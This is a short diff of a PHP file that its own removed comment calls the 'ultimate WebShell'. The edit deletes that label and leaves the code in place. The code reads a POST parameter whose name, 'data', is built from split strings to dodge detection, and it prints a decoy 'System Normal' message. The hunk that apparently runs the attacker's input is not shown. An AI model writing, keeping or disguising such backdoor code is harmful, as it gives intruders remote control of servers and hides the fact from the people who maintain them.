@@ -1,5 +1,5 @@
 <?php
-// 结合两者优势的终极WebShell
+
 $p = $_POST;
 $a = 'a'; $t = 't';
 $param = 'd' . $a . $t . $a;
@@ -14,3 +14,4 @@ if(isset($p[$param])){
     echo "System Normal";
 }
 ?>
+
